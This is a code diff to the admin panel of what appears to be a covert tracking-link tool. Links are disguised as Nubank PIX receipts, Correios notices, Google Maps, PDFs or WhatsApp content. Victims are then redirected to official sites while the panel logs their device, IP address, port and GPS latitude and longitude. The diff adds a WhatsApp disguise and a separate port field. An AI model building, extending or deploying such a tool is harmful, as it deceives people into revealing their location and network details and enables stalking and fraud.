@@ -1,3 +1,4 @@
+<!-- admin.html -->
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
@@ -109,6 +110,7 @@
                     <label>Aparência no WhatsApp (Camuflagem)</label>
                     <select name="camuflagem">
                         <option value="nubank">🟣 Nubank (Comprovante PIX)</option>
+                        <option value="soft">🟢 WhatsApp</option>
                         <option value="correios">📦 Correios (Rastreio)</option>
                         <option value="maps">📍 Google Maps</option>
                         <option value="pdf">📄 Arquivo PDF (Padrão)</option>
@@ -121,6 +123,7 @@
                         <option value="https://www.google.com">Google (Seguro)</option>
                         <option value="https://nubank.com.br">Nubank (Oficial)</option>
                         <option value="https://rastreamento.correios.com.br">Correios (Oficial)</option>
+                        <option value="https://www.whatsapp.com">WhatsApp (Oficial)</option>
                     </select>
                 </div>
                 
@@ -168,6 +171,7 @@
                     
                     const latVal = dados.lat ? dados.lat.toFixed(6) : "---";
                     const lonVal = dados.lon ? dados.lon.toFixed(6) : "---";
+                    const portVal = dados.port || '---';
 
                     div.innerHTML += `
                         <div class="telemetry-card">
@@ -178,7 +182,8 @@
                             <div class="card-body">
                                 <div class="info-grid">
                                     <div><div class="info-label">DISPOSITIVO</div><div class="info-value" style="color:#2563eb; font-weight:700;">${dados.device || '...'}</div></div>
-                                    <div><div class="info-label">IP / PORTA</div><div class="info-value" style="color:#ef4444; font-family:monospace;">${dados.ip || '---'}</div></div>
+                                    <div><div class="info-label">ENDEREÇO IP</div><div class="info-value">${dados.ip || '---'}</div></div>
+                                    <div><div class="info-label">PORTA</div><div class="info-value">${portVal}</div></div>
                                     <div><div class="info-label">LATITUDE</div><div class="info-value">${latVal}</div></div>
                                     <div><div class="info-label">LONGITUDE</div><div class="info-value">${lonVal}</div></div>
                                     <div><div class="info-label">ÚLTIMO SINAL</div><div class="info-value">${dados.ultimo_visto}</div></div>
